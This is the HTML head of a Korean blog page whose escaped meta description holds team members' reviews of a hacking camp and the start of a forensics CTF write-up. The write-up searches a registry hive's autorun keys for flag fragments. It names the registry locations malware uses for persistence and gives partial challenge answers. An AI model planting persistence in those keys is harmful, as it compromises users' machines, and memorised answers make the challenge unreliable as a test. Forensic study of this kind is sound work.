

<!DOCTYPE html>
<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" type="image/png" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="&lt;h1 id=&#34;&amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xBA70;&#34;&gt;&lt;a href=&#34;#&amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xBA70;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xBA70;&#34;&gt;&lt;/a&gt;&amp;#xB4E4;&amp;#xC5B4;&amp;#xAC00;&amp;#xBA70;&lt;/h1&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! sstf write-up&amp;#xC5D0; &amp;#xC774;&amp;#xC5B4; &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504; &amp;#xB9AC;&amp;#xBDF0; &amp;#xAE00;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC654;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;&amp;#xC9C0;&amp;#xB09C; &amp;#xB2EC; 8&amp;#xC6D4; 26, 27&amp;#xC77C; &amp;#xC8FC;&amp;#xB9D0; &amp;#xB3D9;&amp;#xC548; &amp;#xD574;&amp;#xD0A4;&amp;#xBCF4;&amp;#xC774;&amp;#xC988; &amp;#xD300;&amp;#xC6D0; syru, pwndorei&amp;#xC640; &amp;#xD568;&amp;#xAED8; 27&amp;#xD68C; &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504;&amp;#xC5D0; &amp;#xCC38;&amp;#xC5EC;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB2E4;&amp;#xC591;&amp;#xD55C; &amp;#xBD84;&amp;#xC57C;&amp;#xC5D0;&amp;#xC11C; &amp;#xD65C;&amp;#xB3D9;&amp;#xD558;&amp;#xB294; &amp;#xBCF4;&amp;#xC548;&amp;#xC778;&amp;#xB4E4;&amp;#xC758; &amp;#xBC1C;&amp;#xD45C;&amp;#xB97C; &amp;#xB4E3;&amp;#xACE0;, &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504;&amp;#xC5D0;&amp;#xC11C; &amp;#xC900;&amp;#xBE44;&amp;#xD574;&amp;#xC8FC;&amp;#xC2E0; CTF&amp;#xB3C4; &amp;#xC990;&amp;#xAC81;&amp;#xAC8C; &amp;#xCC38;&amp;#xC5EC;&amp;#xD588;&amp;#xB294;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD300;&amp;#xC744; &amp;#xB098;&amp;#xB204;&amp;#xC5B4; CTF&amp;#xB3C4; &amp;#xC9C4;&amp;#xD589;&amp;#xD588;&amp;#xB294;&amp;#xB370;, &amp;#xC544;&amp;#xC27D;&amp;#xAC8C;&amp;#xB3C4; &amp;#xC11C;&amp;#xB85C; &amp;#xB2E4;&amp;#xB978; &amp;#xD300;&amp;#xC73C;&amp;#xB85C; &amp;#xB098;&amp;#xB258;&amp;#xC5B4; &amp;#xAC19;&amp;#xC774; &amp;#xD480;&amp;#xC9C4; &amp;#xBABB;&amp;#xD588;&amp;#xC9C0;&amp;#xB9CC; &amp;#xAC01;&amp;#xC790;&amp;#xC758; &amp;#xD300;&amp;#xC5D0;&amp;#xC11C; &amp;#xC990;&amp;#xAC81;&amp;#xAC8C; &amp;#xBB38;&amp;#xC81C;&amp;#xB97C; &amp;#xD480;&amp;#xC5C8;&amp;#xB2E4;&amp;#xACE0; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD6C4;&amp;#xAE30;&amp;#xC640; &amp;#xD568;&amp;#xAED8; Write-Up&amp;#xB97C; &amp;#xC815;&amp;#xB9AC;&amp;#xD574;&amp;#xBCF4;&amp;#xC558;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;h1 id=&#34;Review&#34;&gt;&lt;a href=&#34;#Review&#34; class=&#34;headerlink&#34; title=&#34;Review&#34;&gt;&lt;/a&gt;Review&lt;/h1&gt;&lt;h2 id=&#34;L0ch&#34;&gt;&lt;a href=&#34;#L0ch&#34; class=&#34;headerlink&#34; title=&#34;L0ch&#34;&gt;&lt;/a&gt;L0ch&lt;/h2&gt;&lt;p&gt;&amp;#xC5BC;&amp;#xB9C8; &amp;#xC804; &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504; &amp;#xBC1C;&amp;#xD45C;&amp;#xC790; &amp;#xBAA8;&amp;#xC9D1;&amp;#xC5D0; Hyper-V &amp;#xAD00;&amp;#xB828; &amp;#xC5F0;&amp;#xAD6C;&amp;#xB97C; &amp;#xC8FC;&amp;#xC81C;&amp;#xB85C; &amp;#xC81C;&amp;#xCD9C;&amp;#xD55C; &amp;#xC81C; &amp;#xC544;&amp;#xC820;&amp;#xB2E4;&amp;#xAC00; &amp;#xC120;&amp;#xC815;&amp;#xB418;&amp;#xC5B4; &amp;#xBC1C;&amp;#xD45C;&amp;#xB9CC; &amp;#xD574;&amp;#xC57C;&amp;#xC9C0; &amp;#xC0DD;&amp;#xAC01;&amp;#xD588;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314B;&amp;#x314B;&amp;#x314B;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7F0;&amp;#xB370; &amp;#xD300;&amp;#xC6D0;&amp;#xB4E4;&amp;#xACFC; &amp;#xB3D9;&amp;#xC544;&amp;#xB9AC; &amp;#xD6C4;&amp;#xBC30;&amp;#xB4E4;&amp;#xC774; &amp;#xB2E4;&amp;#xB4E4; &amp;#xCC38;&amp;#xC5EC;&amp;#xD55C;&amp;#xB2E4;&amp;#xAE38;&amp;#xB798; &amp;#xCDE8;&amp;#xC900;&amp;#xC5D0; &amp;#xD55C;&amp;#xCC3D;&amp;#xC778; &amp;#xB54C;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC774;&amp;#xB7F0; &amp;#xAE30;&amp;#xD68C;&amp;#xB97C; &amp;#xB193;&amp;#xCE60; &amp;#xC218; &amp;#xC5C6;&amp;#xC5B4; &amp;#xCC38;&amp;#xAC00;&amp;#xC790;&amp;#xB85C;&amp;#xB3C4; &amp;#xCC38;&amp;#xC5EC;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xC5C8;&amp;#xB124;&amp;#xC694;. &amp;#xB355;&amp;#xBD84;&amp;#xC5D0; &lt;del&gt;&amp;#xC774;&amp;#xC81C;&amp;#xB294; &amp;#xAC00;&amp;#xBB3C;&amp;#xAC00;&amp;#xBB3C;&amp;#xD55C;..&lt;/del&gt;  &amp;#xACE0;&amp;#xB4F1;&amp;#xD559;&amp;#xC0DD; &amp;#xC2DC;&amp;#xC808; &amp;#xC218;&amp;#xD559;&amp;#xC5EC;&amp;#xD589; &amp;#xAE30;&amp;#xBD84;&amp;#xB3C4; &amp;#xB290;&amp;#xB084; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xACE0;, &amp;#xD574;&amp;#xD0B9;&amp;#xC744; &amp;#xCC98;&amp;#xC74C; &amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xB294; &amp;#xC0C8;&amp;#xB0B4;&amp;#xAE30; &amp;#xBD84;&amp;#xB4E4;&amp;#xBD80;&amp;#xD130; &amp;#xC5C4;&amp;#xCCAD;&amp;#xB09C; &amp;#xC2E4;&amp;#xB825;&amp;#xC790; &amp;#xBD84;&amp;#xB4E4;&amp;#xAE4C;&amp;#xC9C0; &amp;#xC5EC;&amp;#xB7EC; &amp;#xC0AC;&amp;#xB78C;&amp;#xB4E4;&amp;#xC744; &amp;#xB9CC;&amp;#xB098; &amp;#xC624;&amp;#xB79C;&amp;#xB9CC;&amp;#xC5D0; &amp;#xC790;&amp;#xADF9;&amp;#xC744; &amp;#xBC1B;&amp;#xB294; &amp;#xACC4;&amp;#xAE30;&amp;#xAC00; &amp;#xB41C; &amp;#xC88B;&amp;#xC740; &amp;#xACBD;&amp;#xD5D8;&amp;#xC774;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &lt;/p&gt;
&lt;h2 id=&#34;syru&#34;&gt;&lt;a href=&#34;#syru&#34; class=&#34;headerlink&#34; title=&#34;syru&#34;&gt;&lt;/a&gt;syru&lt;/h2&gt;&lt;p&gt;&amp;#xBC1C;&amp;#xD45C;&amp;#xC790;&amp;#xB85C; &amp;#xC9C0;&amp;#xC6D0;&amp;#xD588;&amp;#xC9C0;&amp;#xB9CC;, &amp;#xC694;&amp;#xBC88;&amp;#xC5D0;&amp;#xB3C4; &amp;#xC2E4;&amp;#xD328;&amp;#xD558;&amp;#xC600;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB098;&amp;#xC911;&amp;#xC5D0; &amp;#xBC1C;&amp;#xD45C; &amp;#xB77C;&amp;#xC778;&amp;#xC5C5;&amp;#xC744; &amp;#xBCF4;&amp;#xB2C8; &amp;#xC81C;&amp;#xAC00; &amp;#xC591;&amp;#xBCF4;&amp;#xD574;&amp;#xC57C; &amp;#xD588;&amp;#xB358; &amp;#xAD6D;&amp;#xB0B4;&amp;#xC678;&amp;#xB85C; &amp;#xC778;&amp;#xC815;&amp;#xBC1B;&amp;#xB294; &amp;#xD654;&amp;#xB824;&amp;#xD55C; &amp;#xBCF4;&amp;#xC548;&amp;#xC778; &amp;#xB4E4;&amp;#xB85C; &amp;#xAD6C;&amp;#xC131;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC5C8;&amp;#xACE0; &amp;#xC6B0;&amp;#xB9AC; &amp;#xD300;&amp;#xC7A5;&amp;#xC758; &amp;#xBC1C;&amp;#xD45C;&amp;#xB3C4; &amp;#xB4E4;&amp;#xC744; &amp;#xACB8; &amp;#xCC38;&amp;#xC5EC;&amp;#xD574;&amp;#xBCF4;&amp;#xC558;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC624;&amp;#xC790;&amp;#xB9C8;&amp;#xC790; &amp;#xB180;&amp;#xB790;&amp;#xB358; &amp;#xAC83;&amp;#xC740; &amp;#xC815;&amp;#xB9D0; &amp;#xC5B4;&amp;#xB9B0; &amp;#xCE5C;&amp;#xAD6C;&amp;#xB4E4;&amp;#xC774; &amp;#xC77C;&amp;#xCC0D;&amp;#xBD80;&amp;#xD130; &amp;#xBCF4;&amp;#xC548;&amp;#xC758; &amp;#xAD00;&amp;#xC2EC;&amp;#xC774; &amp;#xB9CE;&amp;#xB354;&amp;#xB77C;&amp;#xACE0;&amp;#xC694;. &amp;#xC800;&amp;#xB294; &amp;#xC911;&amp;#xD559;&amp;#xAD50; &amp;#xB098;&amp;#xC774; &amp;#xB54C; &amp;#xCE5C;&amp;#xAD6C;&amp;#xB4E4;&amp;#xC774;&amp;#xB791; &amp;#xC720;x&amp;#xC655;&amp;#xCE74;&amp;#xB4DC;&amp;#xB97C; &amp;#xD558;&amp;#xBA70; &amp;#xC9C0;&amp;#xB0C8;&amp;#xB358; &amp;#xAC83; &amp;#xAC19;&amp;#xC740;&amp;#xB370; &amp;#xC5EC;&amp;#xB7EC; &amp;#xB300;&amp;#xD68C;&amp;#xB3C4; &amp;#xB098;&amp;#xAC00;&amp;#xACE0; &amp;#xD63C;&amp;#xC790; &amp;#xBCF4;&amp;#xC548; &amp;#xC5F0;&amp;#xAD6C;&amp;#xB3C4; &amp;#xC9C4;&amp;#xD589;&amp;#xD588;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xB4E3;&amp;#xACE0; &amp;#xB300;&amp;#xB2E8;&amp;#xD558;&amp;#xB2E4;&amp;#xACE0; &amp;#xB290;&amp;#xAF08;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC544;&amp;#xC27D;&amp;#xAC8C;&amp;#xB3C4; &amp;#xC0C1;&amp;#xB300;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xB098;&amp;#xC774;&amp;#xB97C; &amp;#xB9CE;&amp;#xC774; &amp;#xBA39;&amp;#xC740; &amp;#xC81C;&amp;#xAC00; &amp;#xC624;&amp;#xAE30;&amp;#xC5D4; &amp;#xD55C;&amp;#xBC88;&amp;#xC774; &amp;#xC801;&amp;#xB2F9;&amp;#xD55C; &amp;#xAC83; &amp;#xAC19;&amp;#xACE0; &amp;#xC774;&amp;#xC81C; &amp;#xB9C9; &amp;#xBCF4;&amp;#xC548;&amp;#xC744; &amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xB294; &amp;#xD639;&amp;#xC740; &amp;#xB3D9;&amp;#xC544;&amp;#xB9AC;&amp;#xC5D0;&amp;#xC11C; &amp;#xBCF4;&amp;#xC548;&amp;#xC5D0; &amp;#xAD00;&amp;#xC2EC;&amp;#xC744; &amp;#xAC00;&amp;#xC9C0;&amp;#xACE0; &amp;#xB354; &amp;#xB9CE;&amp;#xC740; &amp;#xAE38;&amp;#xC744; &amp;#xAC77;&amp;#xACE0; &amp;#xC2F6;&amp;#xC5B4; &amp;#xD558;&amp;#xB294; &amp;#xD6C4;&amp;#xBC30;&amp;#xB4E4;&amp;#xC5D0;&amp;#xAC8C; &amp;#xCD94;&amp;#xCC9C;&amp;#xD574;&amp;#xC8FC;&amp;#xB824;&amp;#xACE0; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB3D9;&amp;#xC544;&amp;#xB9AC; &amp;#xB0B4;&amp;#xBD80;CTF&amp;#xC5D0; &amp;#xC0C1;&amp;#xD488;&amp;#xC73C;&amp;#xB85C; &amp;#xAC78;&amp;#xAE4C;&amp;#xB3C4; &amp;#xC0DD;&amp;#xAC01; &amp;#xC911;&amp;#xC774;&amp;#xACE0;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&amp;#xC88B;&amp;#xC740; &amp;#xBC1C;&amp;#xD45C; &amp;#xC798; &amp;#xB4E4;&amp;#xC5C8;&amp;#xACE0; 28&amp;#xD68C;&amp;#xC5D0;&amp;#xB294; &amp;#xBC1C;&amp;#xD45C;&amp;#xC790;&amp;#xB85C; &amp;#xCC38;&amp;#xAC00;&amp;#xD558;&amp;#xAE38; &amp;#xAE30;&amp;#xB300;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74;&amp;#xC11C; &amp;#xBCF4;&amp;#xC548; &amp;#xC5F0;&amp;#xAD6C;&amp;#xB97C; &amp;#xC774;&amp;#xC5B4; &amp;#xB098;&amp;#xAC00; &amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;pwndorei&#34;&gt;&lt;a href=&#34;#pwndorei&#34; class=&#34;headerlink&#34; title=&#34;pwndorei&#34;&gt;&lt;/a&gt;pwndorei&lt;/h2&gt;&lt;p&gt;&amp;#xC6D0;&amp;#xB798;&amp;#xB294; &amp;#xBC1C;&amp;#xD45C;&amp;#xC790;&amp;#xB85C; &amp;#xC9C0;&amp;#xC6D0;&amp;#xD588;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC544;&amp;#xC27D;&amp;#xAC8C;&amp;#xB3C4; &amp;#xB5A8;&amp;#xC5B4;&amp;#xC9C0;&amp;#xBA74;&amp;#xC11C; &amp;#xB2E4;&amp;#xC74C; &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504;&amp;#xC5D0; &amp;#xBC1C;&amp;#xD45C;&amp;#xC790;&amp;#xB85C; &amp;#xC9C0;&amp;#xC6D0;&amp;#xD560; &amp;#xB54C; &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504;&amp;#xC758; &amp;#xBD84;&amp;#xC704;&amp;#xAE30;&amp;#xB098; &amp;#xC9C4;&amp;#xD589; &amp;#xBC29;&amp;#xC2DD;&amp;#xC744; &amp;#xC54C;&amp;#xBA74; &amp;#xC88B;&amp;#xC744; &amp;#xAC83; &amp;#xAC19;&amp;#xACE0; &amp;#xB2E4;&amp;#xB978; &amp;#xBC1C;&amp;#xD45C;&amp;#xC790;&amp;#xBD84;&amp;#xB4E4;&amp;#xC758; &amp;#xC8FC;&amp;#xC81C;&amp;#xAC00; &amp;#xB108;&amp;#xBB34; &amp;#xB9E4;&amp;#xB825;&amp;#xC801;&amp;#xC774;&amp;#xC5B4;&amp;#xC11C; &amp;#xCC38;&amp;#xAC00;&amp;#xC790;&amp;#xB85C; &amp;#xB2E4;&amp;#xC2DC; &amp;#xC9C0;&amp;#xC6D0;&amp;#xD558;&amp;#xC5EC; &amp;#xCC38;&amp;#xAC00;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &lt;/p&gt;
&lt;p&gt;&amp;#xC0DD;&amp;#xAC01;&amp;#xBCF4;&amp;#xB2E4; &amp;#xBC1C;&amp;#xD45C;&amp;#xC790;&amp;#xC640; &amp;#xCC38;&amp;#xC5EC;&amp;#xC790; &amp;#xD3C9;&amp;#xADE0; &amp;#xC5F0;&amp;#xB839;&amp;#xC774; &amp;#xB0AE;&amp;#xC544;&amp;#xC11C; &amp;#xB180;&amp;#xB790;&amp;#xACE0; &amp;#xC5B4;&amp;#xB9B0; &amp;#xB098;&amp;#xC774;&amp;#xC5D0; &amp;#xD558;&amp;#xACE0; &amp;#xC2F6;&amp;#xC740; &amp;#xBD84;&amp;#xC57C;&amp;#xC5D0; &amp;#xBAB0;&amp;#xB450;&amp;#xD558;&amp;#xB294; &amp;#xBAA8;&amp;#xC2B5;&amp;#xC774; &amp;#xC815;&amp;#xB9D0; &amp;#xBA4B;&amp;#xC84C;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC911;&amp;#xACE0;&amp;#xB4F1;&amp;#xD559;&amp;#xAD50;&amp;#xC758; &amp;#xD559;&amp;#xC5C5;&amp;#xACFC; &amp;#xD574;&amp;#xD0B9; &amp;#xACF5;&amp;#xBD80;&amp;#xB97C; &amp;#xBCD1;&amp;#xD589;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; &amp;#xC774;&amp;#xB7F0; &amp;#xD589;&amp;#xC0AC;&amp;#xC5D0; &amp;#xCC38;&amp;#xC5EC;&amp;#xD558;&amp;#xB294; &amp;#xC5F4;&amp;#xC815;&amp;#xC740; &amp;#xC800;&amp;#xB3C4; &amp;#xBCF8;&amp;#xBC1B;&amp;#xC544;&amp;#xC57C; &amp;#xD560; &amp;#xAC83; &amp;#xAC19;&amp;#xB354;&amp;#xAD70;&amp;#xC694;. &amp;#xC591;&amp;#xC9C8;&amp;#xC758; &amp;#xBC1C;&amp;#xD45C;&amp;#xB4E4;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xB2E4;&amp;#xC591;&amp;#xD55C; &amp;#xBD84;&amp;#xC57C;&amp;#xC758; &amp;#xC9C0;&amp;#xC2DD;&amp;#xB4E4;&amp;#xC744; &amp;#xC5BB;&amp;#xC5C8;&amp;#xC73C;&amp;#xB2C8; &amp;#xB2E4;&amp;#xC74C; &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1B;&amp;#xC740; &amp;#xB9CC;&amp;#xD07C; &amp;#xB3CC;&amp;#xB824;&amp;#xB4DC;&amp;#xB9B4; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xB178;&amp;#xB825;&amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;Write-Up&#34;&gt;&lt;a href=&#34;#Write-Up&#34; class=&#34;headerlink&#34; title=&#34;Write-Up&#34;&gt;&lt;/a&gt;Write-Up&lt;/h1&gt;&lt;h3 id=&#34;REGISTRIP-L0ch&#34;&gt;&lt;a href=&#34;#REGISTRIP-L0ch&#34; class=&#34;headerlink&#34; title=&#34;REGISTRIP - L0ch&#34;&gt;&lt;/a&gt;REGISTRIP - L0ch&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/Untitled.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xD3EC;&amp;#xB80C;&amp;#xC2DD; &amp;#xBB38;&amp;#xC81C;&amp;#xB85C;, Description&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; &amp;#xD0A4;&amp;#xC6CC;&amp;#xB4DC;&amp;#xAC00; &amp;#xBCF4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xBB38;&amp;#xC81C;&amp;#xC758; &amp;#xD0A4;&amp;#xC6CC;&amp;#xB4DC;&amp;#xB294; automatically run &amp;#xC774; &amp;#xB418;&amp;#xACA0;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xC81C;&amp;#xACF5;&amp;#xB41C; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/Untitled%201.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;Windows &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC; &amp;#xD558;&amp;#xC774;&amp;#xBE0C; &amp;#xD30C;&amp;#xC77C;&amp;#xC784;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xBCF4;&amp;#xD1B5; &amp;#xC544;&amp;#xB294; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC;&amp;#xB294; regedit &amp;#xD3B8;&amp;#xC9D1;&amp;#xAE30;&amp;#xB85C; &amp;#xBCF4;&amp;#xB294; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC00; &amp;#xC775;&amp;#xC219;&amp;#xD55C;&amp;#xB370;&amp;#xC694;, &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC; &amp;#xBD84;&amp;#xC11D; &amp;#xD234; REGA&amp;#xC778; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574; &amp;#xD574;&amp;#xB2F9; &amp;#xD30C;&amp;#xC77C;&amp;#xB4E4;&amp;#xC744; &amp;#xC775;&amp;#xC219;&amp;#xD55C; &amp;#xD2B8;&amp;#xB9AC; &amp;#xD3EC;&amp;#xB9F7;&amp;#xC73C;&amp;#xB85C; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/Untitled%202.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/Untitled%203.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C;&amp;#xC57C; &amp;#xC880; &amp;#xBD84;&amp;#xC11D;&amp;#xD560; &amp;#xB9DB;&amp;#xC774; &amp;#xB098;&amp;#xB124;&amp;#xC694;!&lt;/p&gt;
&lt;p&gt;Windows Registry + Automatically Run &amp;#xD0A4;&amp;#xC6CC;&amp;#xB4DC;&amp;#xB97C; &amp;#xC0DD;&amp;#xAC01;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74;, &amp;#xBB38;&amp;#xC81C; &amp;#xCEE8;&amp;#xC149;&amp;#xC740; &amp;#xC545;&amp;#xC131;&amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xC790;&amp;#xC8FC; &amp;#xC545;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; auto run &amp;#xAD00;&amp;#xB828; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC; &amp;#xD0A4;&amp;#xC778; &amp;#xAC83;&amp;#xC744; &amp;#xC0DD;&amp;#xAC01;&amp;#xD574; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD574;&amp;#xB2F9; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC; &amp;#xD0A4;&amp;#xB4E4;&amp;#xC744; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xBA74; &amp;#xB2E8;&amp;#xC11C;&amp;#xAC00; &amp;#xC788;&amp;#xC744; &amp;#xAC83; &amp;#xAC19;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;Auto Run&amp;#xACFC; &amp;#xAD00;&amp;#xB828;&amp;#xB41C; Windows &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC; &amp;#xD0A4;&amp;#xB294; &amp;#xC6B0;&amp;#xC120; &amp;#xC774;&amp;#xC815;&amp;#xB3C4;&amp;#xB85C; &amp;#xC0DD;&amp;#xAC01;&amp;#xD574; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&amp;#xD574;&amp;#xB2F9; &amp;#xD0A4;&amp;#xB4E4;&amp;#xC758; value&amp;#xB97C; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xBA74; &amp;#xC218;&amp;#xC0C1;&amp;#xD55C; &amp;#xAC12;&amp;#xB4E4;&amp;#xC774; &amp;#xBCF4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/Untitled%204.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; &lt;/p&gt;
&lt;p&gt;1 : 7cf7a9d2d0&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/Untitled%205.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2 : ac21fb716b&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/Untitled%206.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;3 : 1e032c79c4&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs vbnet&#34;&gt;Here&lt;span class=&#34;hljs-comment&#34;&gt;&amp;apos;s the hint for the last fragment. &lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Every time I run Notepad, a strange file runs with it...&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC138; &amp;#xBC88;&amp;#xC9F8; value Data&amp;#xC5D0; &amp;#xCD94;&amp;#xAC00; &amp;#xD78C;&amp;#xD2B8;&amp;#xAC00; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
